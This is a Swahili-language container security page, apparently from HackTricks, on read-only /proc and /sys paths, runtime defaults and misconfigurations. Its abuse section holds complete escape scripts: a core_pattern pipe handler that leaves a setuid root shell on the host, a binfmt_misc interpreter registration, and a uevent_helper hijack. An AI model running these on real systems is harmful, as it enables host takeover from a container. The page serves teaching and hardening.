# Njia za Mfumo za Kusoma-tu

{{#include ../../../../banners/hacktricks-training.md}}

Njia za mfumo zilizosomwa-tu ni ulinzi tofauti kutoka kwa njia zilizofichwa. Badala ya kuficha njia kabisa, runtime inaifichua lakini inaifunga kama kusoma-tu. Hii ni kawaida kwa maeneo maalum ya procfs na sysfs ambapo ufikiaji wa kusoma unaweza kukubalika au kuwa muhimu kwa uendeshaji, lakini kuandika kutakuwa hatari sana.

Madhumuni ni wazi: interfaces nyingi za kernel zinakuwa hatari zaidi wakati zinaweza kuandikwa. Mount ya kusoma-tu haitoi thamani yote ya uchunguzi, lakini inapunguza uwezo wa workload iliyoharibiwa kubadilisha faili zinazokutana na kernel kupitia njia hiyo.

## Uendeshaji

Runtimes mara nyingi huweka sehemu za muonekano wa proc/sys kama kusoma-tu. Kulingana na runtime na host, hii inaweza kujumuisha njia kama:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Orodha halisi inatofautiana, lakini mtindo ni ule ule: ruhusu uonekano pale linapohitajika, kata mabadiliko kwa chaguo-msingi.

## Maabara

Chunguza orodha ya njia za kusoma-tu zilizoainishwa na Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Chunguza muonekano uliopandishwa wa proc/sys kutoka ndani ya container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Athari kwa Usalama

Read-only system paths hupunguza aina kubwa ya matumizi mabaya yanayoathiri mwenyeji. Hata kama mshambuliaji anaweza kuchunguza procfs au sysfs, kutoweza kuandika huko kunaondoa njia nyingi za mabadiliko za moja kwa moja zinazohusisha kernel tunables, crash handlers, module-loading helpers, au interface nyingine za udhibiti. Ufunikaji haujatoweka kabisa, lakini hatua kutoka kwa ufichuzi wa taarifa hadi kuathiri mwenyeji inakuwa ngumu zaidi.

## Usanidi usio sahihi

Makosa makuu ni ku-unmask au ku-remount path nyeti kama read-write, kuonyesha moja kwa moja yaliyomo ya host proc/sys kwa writable bind mounts, au kutumia privileged modes ambazo kwa ufanisi hupitisha defaults salama za runtime. Katika Kubernetes, `procMount: Unmasked` na privileged workloads mara nyingi huenda pamoja na ulinzi dhaifu wa proc. Jambo lingine la kawaida kwenye operesheni ni kudhani kwamba kwa sababu runtime kwa kawaida inamemount path hizi kama read-only, workloads zote bado zinapata default hiyo.

## Matumizi mabaya

Ikiwa ulinzi ni dhaifu, anza kwa kutafuta writable proc/sys entries:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wakati vipengee vinavyoweza kuandikwa vipo, njia za ufuatiliaji zenye thamani kubwa ni pamoja na:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Vingizo vinavyoweza kuandikwa chini ya `/proc/sys` mara nyingi vinaonyesha kuwa container inaweza kubadilisha tabia ya host kernel badala ya kuichunguza tu.
- `core_pattern` ni muhimu hasa kwa sababu thamani inayoweza kuandikwa inayokabili host inaweza kubadilishwa kuwa njia ya host code-execution kwa kugonga mchakato baada ya kuweka pipe handler.
- `modprobe` inaonyesha helper inayotumiwa na kernel kwa mtiririko unaohusiana na module-loading; ni lengo la thamani kubwa (classic high-value target) linapoweza kuandikwa.
- `binfmt_misc` inakuambia kama usajili wa custom interpreter unawezekana. Ikiwa usajili unaweza kuandikwa, hili linaweza kuwa execution primitive badala ya kuwa information leak tu.
- `panic_on_oom` inaamua suala la kernel linaloathiri host nzima na kwa hivyo inaweza kubadilisha uchovu wa rasilimali kuwa host denial of service.
- `uevent_helper` ni mojawapo ya mifano wazi kabisa ya sysfs helper path inayoweza kuandikwa inayozalisha host-context execution.

Matokeo ya kuvutia ni pamoja na proc knobs zinazoonekana kwa host au entries za sysfs zinazoweza kuandikwa ambazo kwa kawaida zingekuwa read-only. Wakati huo, workload imehamia kutoka mtazamo uliokandamizwa wa container kuelekea ushawishi muhimu juu ya kernel.

### Mfano Kamili: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ikiwa njia hiyo kweli inafikia kernel ya host, payload inatekelezwa kwenye host na inaacha setuid shell nyuma.

### Mfano Kamili: `binfmt_misc` Usajili

Ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa, usajili wa mfasiri maalum unaweza kusababisha utekelezaji wa msimbo wakati faili inayolingana inapotekelezwa:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Kwenye `binfmt_misc` ya host inayoweza kuandikwa, matokeo ni utekelezaji wa msimbo katika njia ya interpreter iliyochochewa na kernel.

### Mfano Kamili: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kuitisha helper ya host-path wakati tukio linalolingana linapochochewa:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Sababu inayofanya hili kuwa hatari sana ni kwamba helper path hutatuliwa kutoka mtazamo wa host filesystem badala ya kutoka muktadha salama wa container-only.

## Ukaguzi

Vikaguzi hivi vinaamua kama ufichaji wa procfs/sysfs umewekwa kuwa read-only pale panapotarajiwa na kama workload bado inaweza kubadilisha kiolesura nyeti za kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Kinachovutia hapa:

- Workload iliyoimarishwa kawaida inapaswa kufichua vichache sana vya /proc/sys vinavyoweza kuandikwa.
- Njia za `/proc/sys` zinazoweza kuandikwa mara nyingi ni muhimu zaidi kuliko ufikivu wa kawaida wa kusoma.
- Ikiwa runtime inasema njia ni read-only lakini kwa vitendo inaweza kuandikwa, kagua mount propagation, bind mounts, na privilege settings kwa makini.

## Mipangilio ya Default ya Runtime

| Runtime / jukwaa | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida wa mkono |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi | Docker hufafanua orodha ya chaguo-msingi ya njia za read-only kwa entries nyeti za proc | kufichua host proc/sys mounts, `--privileged` |
| Podman | Imewezeshwa kwa chaguo-msingi | Podman inatumia njia za read-only za chaguo-msingi isipokuwa zikarahisishwa waziwazi | `--security-opt unmask=ALL`, host mounts pana, `--privileged` |
| Kubernetes | Inarithi chaguo-msingi za runtime | Inatumia mfano wa njia za read-only wa runtime ya msingi isipokuwa ikidhoofishwa na mipangilio ya Pod au host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Default ya runtime | Kawaida hutegemea chaguo-msingi za OCI/runtime | sawa na safu ya Kubernetes; mabadiliko ya moja kwa moja ya config ya runtime yanaweza kudhoofisha tabia |

Nukta kuu ni kwamba njia za mfumo za read-only kwa kawaida zinapatikana kama chaguo-msingi ya runtime, lakini ni rahisi kuzidhoofisha kwa modes za privileged au host bind mounts.
